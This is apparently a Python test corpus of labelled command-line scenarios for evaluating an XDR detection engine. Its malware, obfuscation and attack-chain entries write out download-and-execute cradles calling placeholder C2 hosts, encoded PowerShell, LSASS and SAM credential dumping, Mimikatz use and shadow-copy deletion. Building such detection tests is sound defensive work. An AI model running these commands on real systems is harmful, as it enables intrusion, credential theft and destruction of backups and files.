"""NivXRay XDR — P0-1 Corpus of 70 labelled scenarios.

INDEPENDENCE INVARIANT (owner-locked):
  Ground truth in this file is authored INDEPENDENTLY, from
  first principles of the underlying security behaviour, and NOT
  read back from NivXRay's own output.  Any scenario whose
  ground truth was suggested by a NivXRay response has been
  manually re-verified against the underlying command language.

Buckets:
  · benign (20)      — plain admin activity that MUST NOT flag
  · suspicious (15)  — dual-use / edge cases; SHOULD remain UNCERTAIN
  · malware (20)     — clearly malicious behaviour; SHOULD flag
  · obfuscation (15) — encoded / caret / xor / hex / multi-layer
  · e2e (6)          — multi-event attack chains

Every scenario is a `Scenario` dataclass with expected labels for
every metric we can honestly measure.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Literal


Verdict  = Literal["BENIGN", "UNCERTAIN", "SUSPICIOUS", "MALICIOUS"]
Severity = Literal["NONE", "LOW", "MEDIUM", "HIGH", "CRITICAL"]


@dataclass(frozen=True)
class Scenario:
    id:             str
    bucket:         Literal["benign", "suspicious", "malware",
                            "obfuscation", "e2e"]
    inputs:         list[str]                                     # one or more command lines
    expected_verdict:   Verdict
    expected_severity:  Severity
    expected_techniques: tuple[str, ...] = ()
    expected_iocs:       tuple[tuple[str, str], ...] = ()          # (kind, value)
    expected_decoded_layers: int = 0
    expected_decoded_substrings: tuple[str, ...] = ()
    notes:          str = ""


CORPUS: list[Scenario] = [

    # ═══════════════ BENIGN (20) — MUST NOT FLAG ═══════════════
    Scenario("benign-01", "benign", ["ipconfig /all"],
             "BENIGN", "NONE", (), (), 0, (),
             "Trivial network config lookup"),
    Scenario("benign-02", "benign", ["dir C:\\Users"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-03", "benign", ["net user"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-04", "benign", ["whoami"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-05", "benign", ["ping google.com"],
             "BENIGN", "NONE", (), (("domain", "google.com"),), 0, (),
             "Domain IOC extraction is fine; verdict must still be benign"),
    Scenario("benign-06", "benign", ["tasklist"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-07", "benign", ["systeminfo"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-08", "benign", ["cd C:\\Users\\alice"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-09", "benign", ["type C:\\Users\\alice\\notes.txt"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-10", "benign", ["copy report.docx C:\\Backup\\"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-11", "benign", ["git status"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-12", "benign", ["python -m pytest tests/"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-13", "benign", ["npm run build"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-14", "benign", ["docker ps"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-15", "benign", ["kubectl get pods"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-16", "benign", ["notepad C:\\Users\\alice\\todo.txt"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-17", "benign", ["explorer.exe C:\\Users\\alice\\Documents"],
             "BENIGN", "NONE", (), (), 0, ()),
    Scenario("benign-18", "benign", ["msedge.exe https://learn.microsoft.com/"],
             "BENIGN", "NONE", (), (("url", "https://learn.microsoft.com/"),), 0, ()),
    Scenario("benign-19", "benign", ["Get-Process | Sort-Object CPU -Descending"],
             "BENIGN", "NONE", (), (), 0, (),
             "PowerShell but no download, no exec, no obfuscation"),
    Scenario("benign-20", "benign", ["Get-Service | Where-Object Status -eq 'Running'"],
             "BENIGN", "NONE", (), (), 0, ()),

    # ═══════════════ SUSPICIOUS (15) — DUAL-USE / UNCERTAIN ═══════════════
    Scenario("susp-01", "suspicious", ["whoami /priv"],
             "UNCERTAIN", "LOW", (), (), 0, (),
             "Priv enumeration by admin is normal; by non-admin is suspicious"),
    Scenario("susp-02", "suspicious", ["net localgroup administrators"],
             "UNCERTAIN", "LOW", (), (), 0, ()),
    Scenario("susp-03", "suspicious", ["wmic process list brief"],
             "UNCERTAIN", "LOW", (), (), 0, ()),
    Scenario("susp-04", "suspicious", ["reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
             "UNCERTAIN", "LOW", (), (), 0, (),
             "Autoruns enumeration"),
    Scenario("susp-05", "suspicious", ["schtasks /query /fo LIST /v"],
             "UNCERTAIN", "LOW", (), (), 0, ()),
    Scenario("susp-06", "suspicious",
             ["powershell -c \"iwr https://github.com/user/tool/releases -OutFile tool.exe\""],
             "UNCERTAIN", "MEDIUM", (),
             (("url", "https://github.com/user/tool/releases"),), 0, (),
             "GitHub download is dual-use"),
    Scenario("susp-07", "suspicious", ["nltest /domain_trusts"],
             "UNCERTAIN", "LOW", (), (), 0, ()),
    Scenario("susp-08", "suspicious", ["Get-ADUser -Filter *"],
             "UNCERTAIN", "LOW", (), (), 0, ()),
    Scenario("susp-09", "suspicious", ["netstat -ano"],
             "UNCERTAIN", "LOW", (), (), 0, ()),
    Scenario("susp-10", "suspicious", ["arp -a"],
             "UNCERTAIN", "LOW", (), (), 0, ()),
    Scenario("susp-11", "suspicious", ["route print"],
             "UNCERTAIN", "LOW", (), (), 0, ()),
    Scenario("susp-12", "suspicious",
             ["net use \\\\fileserver.corp\\share /user:alice password"],
             "UNCERTAIN", "MEDIUM", (), (), 0, (),
             "Credential in commandline"),
    Scenario("susp-13", "suspicious",
             ["powershell -c \"Invoke-WebRequest https://internal-cdn.corp/patch.msi -OutFile patch.msi\""],
             "UNCERTAIN", "LOW", (),
             (("url", "https://internal-cdn.corp/patch.msi"),), 0, ()),
    Scenario("susp-14", "suspicious",
             ["Enable-PSRemoting -Force"],
             "UNCERTAIN", "MEDIUM", (), (), 0, ()),
    Scenario("susp-15", "suspicious",
             ["net user helpdesk P@ssw0rd! /add"],
             "UNCERTAIN", "MEDIUM", (), (), 0, (),
             "Local user creation — dual-use"),

    # ═══════════════ MALWARE (20) — CLEARLY MALICIOUS ═══════════════
    Scenario("mal-01", "malware",
             ["powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/a.ps1')\""],
             "MALICIOUS", "HIGH", ("T1059.001", "T1105"),
             (("url", "http://198.51.100.42/a.ps1"), ("ipv4", "198.51.100.42")),
             0, ()),
    Scenario("mal-02", "malware",
             ["cmd /c bitsadmin /transfer x /priority high http://malicious.example/f.exe C:\\Users\\Public\\f.exe & C:\\Users\\Public\\f.exe"],
             "MALICIOUS", "HIGH", ("T1197", "T1105"),
             (("url", "http://malicious.example/f.exe"),), 0, ()),
    Scenario("mal-03", "malware",
             ["certutil -urlcache -split -f http://evil.example/x.exe C:\\Users\\Public\\x.exe"],
             "MALICIOUS", "HIGH", ("T1105",),
             (("url", "http://evil.example/x.exe"),), 0, ()),
    Scenario("mal-04", "malware",
             ["mshta http://malicious.example/a.hta"],
             "MALICIOUS", "HIGH", ("T1218.005",),
             (("url", "http://malicious.example/a.hta"),), 0, ()),
    Scenario("mal-05", "malware",
             ["regsvr32 /s /n /u /i:http://evil.example/b.sct scrobj.dll"],
             "MALICIOUS", "HIGH", ("T1218.010",),
             (("url", "http://evil.example/b.sct"),), 0, ()),
    Scenario("mal-06", "malware",
             ["rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc\")"],
             "MALICIOUS", "HIGH", ("T1218.011",), (), 0, ()),
    Scenario("mal-07", "malware",
             ["wmic process call create \"powershell -nop -c IEX(iwr http://c2.example/beacon.ps1 -UseBasicParsing)\""],
             "MALICIOUS", "HIGH", ("T1047", "T1059.001", "T1105"),
             (("url", "http://c2.example/beacon.ps1"),), 0, ()),
    Scenario("mal-08", "malware",
             ["cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svcup /t REG_SZ /d \"C:\\Users\\Public\\bot.exe\" /f"],
             "MALICIOUS", "MEDIUM", ("T1547.001",), (), 0, ()),
    Scenario("mal-09", "malware",
             ["schtasks /create /sc onlogon /tn svcup /tr \"C:\\Users\\Public\\bot.exe\" /rl highest"],
             "MALICIOUS", "MEDIUM", ("T1053.005",), (), 0, ()),
    Scenario("mal-10", "malware",
             ["vssadmin delete shadows /all /quiet"],
             "MALICIOUS", "CRITICAL", ("T1490",), (), 0, (),
             "Ransomware precursor"),
    Scenario("mal-11", "malware",
             ["wbadmin delete catalog -quiet"],
             "MALICIOUS", "HIGH", ("T1490",), (), 0, ()),
    Scenario("mal-12", "malware",
             ["bcdedit /set {default} recoveryenabled No"],
             "MALICIOUS", "HIGH", ("T1490",), (), 0, ()),
    Scenario("mal-13", "malware",
             ["cmd /c net user helpdesk P@ssw0rd! /add & net localgroup administrators helpdesk /add"],
             "MALICIOUS", "HIGH", ("T1136.001", "T1098"), (), 0, ()),
    Scenario("mal-14", "malware",
             ["reg save HKLM\\SAM C:\\Users\\Public\\sam.hive & reg save HKLM\\SYSTEM C:\\Users\\Public\\system.hive"],
             "MALICIOUS", "CRITICAL", ("T1003.002",), (), 0, (),
             "Credential-hive dumping"),
    Scenario("mal-15", "malware",
             ["procdump.exe -ma lsass.exe C:\\Users\\Public\\lsass.dmp"],
             "MALICIOUS", "CRITICAL", ("T1003.001",), (), 0, ()),
    Scenario("mal-16", "malware",
             ["curl -s http://c2.example/beacon | sh"],
             "MALICIOUS", "HIGH", ("T1059.004", "T1105"),
             (("url", "http://c2.example/beacon"),), 0, ()),
    Scenario("mal-17", "malware",
             ["bash -c 'wget -q http://c2.example/x -O /tmp/x; chmod +x /tmp/x; /tmp/x'"],
             "MALICIOUS", "HIGH", ("T1059.004", "T1105", "T1222.002"),
             (("url", "http://c2.example/x"),), 0, ()),
    Scenario("mal-18", "malware",
             ["net use \\\\10.0.0.5\\C$ /u:admin P@ss & copy bot.exe \\\\10.0.0.5\\C$\\Users\\Public\\"],
             "MALICIOUS", "HIGH", ("T1021.002", "T1570"),
             (("ipv4", "10.0.0.5"),), 0, ()),
    Scenario("mal-19", "malware",
             ["esentutl.exe /y C:\\Windows\\System32\\config\\SAM /d C:\\Users\\Public\\sam.copy"],
             "MALICIOUS", "CRITICAL", ("T1003.002",), (), 0, ()),
    Scenario("mal-20", "malware",
             ["cmd /c ping -n 1 evil.example > NUL & type C:\\Users\\Public\\stage.bin | more"],
             "MALICIOUS", "MEDIUM", ("T1071",),
             (("domain", "evil.example"),), 0, ()),

    # ═══════════════ OBFUSCATION (15) ═══════════════
    # NOTE: expected_decoded_layers is the LOWER BOUND — the pipeline
    # may peel more than one stage.  We assert `>= expected`.
    Scenario("obf-01", "obfuscation",
             ["powershell -NoProfile -EncodedCommand "
              "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA5ADkALwBpAG4AZAAuAHAAcwAxACcAKQA="],
             "MALICIOUS", "HIGH", ("T1027", "T1059.001", "T1105"),
             (("url", "http://198.51.100.99/ind.ps1"), ("ipv4", "198.51.100.99")),
             1, ("DownloadString", "198.51.100.99")),
    Scenario("obf-02", "obfuscation",
             ["cmd /c \"h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f\""],
             "SUSPICIOUS", "MEDIUM", ("T1027",),
             (("url", "https://tommy-aa.lol/f"),), 0,
             ("tommy-aa.lol",),
             "Owner-supplied caret-normalisation sample — MANDATORY regression"),
    Scenario("obf-03", "obfuscation",
             ["cmd /c set q8k3=where c*d.e?e& %q8k3%"],
             "SUSPICIOUS", "MEDIUM", ("T1027",), (), 0, (),
             "Wildcard-executable-resolution — command-language deobfuscation"),
    Scenario("obf-04", "obfuscation",
             ["powershell -e "
              "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBhACcAKQA="],
             "MALICIOUS", "HIGH", ("T1027", "T1059.001", "T1105"),
             (("url", "http://evil.example/a"),), 1,
             ("DownloadString", "evil.example")),
    Scenario("obf-05", "obfuscation",
             ["powershell -c \"$s = 'aHR0cDovL2V2aWwuZXhhbXBsZS94'; "
              "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))\""],
             "MALICIOUS", "MEDIUM", ("T1027",),
             (("url", "http://evil.example/x"),), 0,
             ("evil.example",)),
    Scenario("obf-06", "obfuscation",
             ["powershell -c \"$a='iex';$b=(iwr http://c2.example/p);"
              "&$a $b.Content\""],
             "MALICIOUS", "HIGH", ("T1027", "T1059.001"),
             (("url", "http://c2.example/p"),), 0, ()),
    Scenario("obf-07", "obfuscation",
             ["powershell -c \"$e=[char]105+[char]101+[char]120;"
              "&$e (iwr http://c2.example/q).Content\""],
             "MALICIOUS", "HIGH", ("T1027", "T1059.001"),
             (("url", "http://c2.example/q"),), 0, ()),
    Scenario("obf-08", "obfuscation",
             ["cmd /c ^p^o^w^e^r^s^h^e^l^l ^-^c calc"],
             "SUSPICIOUS", "MEDIUM", ("T1027",), (), 0, (),
             "Caret obfuscation of the command itself"),
    Scenario("obf-09", "obfuscation",
             ["powershell -c \"iex(iwr('http://c2.example/z') -Method Get -UseBasicParsing).Content\""],
             "MALICIOUS", "HIGH", ("T1059.001", "T1105"),
             (("url", "http://c2.example/z"),), 0, (),
             "Not really obfuscated but common enough to test the pipeline"),
    Scenario("obf-10", "obfuscation",
             ["cmd /c set a=power&set b=shell&%a%%b% -c \"iex(iwr http://c2.example/y)\""],
             "MALICIOUS", "HIGH", ("T1027", "T1059.001"),
             (("url", "http://c2.example/y"),), 0, (),
             "Variable-split powershell"),
    Scenario("obf-11", "obfuscation",
             ["powershell -c \"$k=0x37;$b=[Convert]::FromBase64String('deadbeef');"
              "for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor$k}\""],
             "SUSPICIOUS", "MEDIUM", ("T1027",), (), 0, (),
             "Single-byte XOR decode template"),
    Scenario("obf-12", "obfuscation",
             ["mshta \"javascript:x=new ActiveXObject('WScript.Shell');"
              "x.Run('powershell -c iex(iwr http://c2.example/w)')\""],
             "MALICIOUS", "HIGH", ("T1218.005", "T1059.001"),
             (("url", "http://c2.example/w"),), 0, ()),
    Scenario("obf-13", "obfuscation",
             ["powershell -c \"[Reflection.Assembly]::"
              "Load([Convert]::FromBase64String('TVqQAAMAAA...'))\""],
             "MALICIOUS", "CRITICAL", ("T1027", "T1620"), (), 0,
             ("TVqQAA",),
             "In-memory PE reflective load — Base64 header signals PE"),
    Scenario("obf-14", "obfuscation",
             ["cmd /c \"echo Invoke-Expression | powershell -c -\""],
             "MALICIOUS", "MEDIUM", ("T1059.001",), (), 0, (),
             "Stdin-piped powershell — evades commandline scanners"),
    Scenario("obf-15", "obfuscation",
             ["powershell -c \"& ('{1}{0}' -f 'ex','i') (iwr http://c2.example/v).Content\""],
             "MALICIOUS", "HIGH", ("T1027", "T1059.001"),
             (("url", "http://c2.example/v"),), 0, (),
             "Format-string function-name assembly (Invoke-Obfuscation-style)"),

    # ═══════════════ END-TO-END CHAINS (6) ═══════════════
    # e2e scenarios carry MULTIPLE inputs; ground truth is at the
    # incident level.  Per §14 of the report we honestly note that
    # NivXRay's incident pipeline requires seeded DB state, so
    # incident-level verdict/severity are NOT MEASURABLE in this
    # session — we only measure per-input decoder + IOC coverage.
    Scenario("e2e-01", "e2e", [
        "outlook.exe /recycle",   # phishing arrival — proxy signal
        "winword.exe /q C:\\Users\\alice\\Downloads\\Invoice.docm",
        "powershell -NoP -w hidden -EncodedCommand "
        "SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB4AGEAbQBwAGwAZQAvAHMAdABhAGcAZQAxACcAKQA=",
        "bitsadmin /transfer y http://c2.example/stage2.exe C:\\Users\\Public\\s.exe",
        "C:\\Users\\Public\\s.exe",
        "reg add HKCU\\...\\Run /v svcup /t REG_SZ /d C:\\Users\\Public\\s.exe /f",
        "curl -s http://c2.example/beacon",
    ], "MALICIOUS", "CRITICAL",
       ("T1566.001", "T1204.002", "T1059.001", "T1105",
        "T1197", "T1547.001", "T1071.001"),
       (("url", "http://c2.example/stage1"),
        ("url", "http://c2.example/stage2.exe"),
        ("url", "http://c2.example/beacon")),
       1, ("c2.example",),
       "Phishing → Office → PS -Enc → BITS stage2 → exec → persistence → C2"),
    Scenario("e2e-02", "e2e", [
        "cmd /c \"net user helpdesk P@ssw0rd! /add & net localgroup administrators helpdesk /add\"",
        "reg save HKLM\\SAM C:\\Users\\Public\\sam.hive",
        "wmic shadowcopy delete",
        "vssadmin delete shadows /all /quiet",
        "cmd /c del /f /q C:\\Users\\alice\\*.*",
    ], "MALICIOUS", "CRITICAL",
       ("T1136.001", "T1098", "T1003.002", "T1490", "T1485"),
       (), 0, (),
       "Ransomware precursor: acct+priv → SAM dump → shadow delete → wipe"),
    Scenario("e2e-03", "e2e", [
        "chrome.exe \"http://legit.example/kb=1234\"",
        "cmd /c whoami /priv",
        "cmd /c net localgroup administrators",
        "cmd /c dir C:\\Users\\alice\\Documents",
    ], "BENIGN", "NONE", (), (("url", "http://legit.example/kb=1234"),), 0, (),
       "Analyst investigating something themselves — must NOT flag"),
    Scenario("e2e-04", "e2e", [
        "powershell -c \"Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'\"",
        "net use \\\\dc01\\C$ /u:helpdesk P@ssw0rd!",
        "copy \\\\dc01\\C$\\Windows\\NTDS\\ntds.dit C:\\Users\\Public\\",
    ], "MALICIOUS", "CRITICAL",
       ("T1003.001", "T1078", "T1021.002", "T1003.003"),
       (), 0, (),
       "Credential access → lateral movement → domain compromise"),
    Scenario("e2e-05", "e2e", [
        "powershell -EncodedCommand "
        "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AZQB4AGEAbQBwAGwAZQAvAGwAcwAuAHAAcwAxACkALgBDAG8AbgB0AGUAbgB0AA==",
        "wmic /node:'10.0.0.5' process call create 'powershell -EncodedCommand ...'",
        "wmic /node:'10.0.0.7' process call create 'powershell -EncodedCommand ...'",
    ], "MALICIOUS", "HIGH",
       ("T1059.001", "T1027", "T1047", "T1021.006"),
       (("url", "http://attacker.example/ls.ps1"),
        ("ipv4", "10.0.0.5"), ("ipv4", "10.0.0.7")),
       1, ("attacker.example",),
       "Lateral movement via WMI-Exec pattern"),
    Scenario("e2e-06", "e2e", [
        "cmd /c ipconfig /all",
        "cmd /c whoami",
        "cmd /c net user helpdesk P@ssw0rd! /add",
    ], "SUSPICIOUS", "MEDIUM", ("T1136.001",), (), 0, (),
       "Partial chain — recon + local-account creation with no follow-through. "
       "Should escalate to SUSPICIOUS not MALICIOUS; verdict engine must not "
       "over-promote on partial evidence"),
]

assert len(CORPUS) == 76, f"corpus count mismatch: {len(CORPUS)}"
# Owner-mandated buckets: 20+15+20+15+6 = 76
_by_bucket = {b: sum(1 for s in CORPUS if s.bucket == b)
              for b in ("benign", "suspicious", "malware", "obfuscation", "e2e")}
assert _by_bucket == {"benign": 20, "suspicious": 15, "malware": 20,
                      "obfuscation": 15, "e2e": 6}, _by_bucket
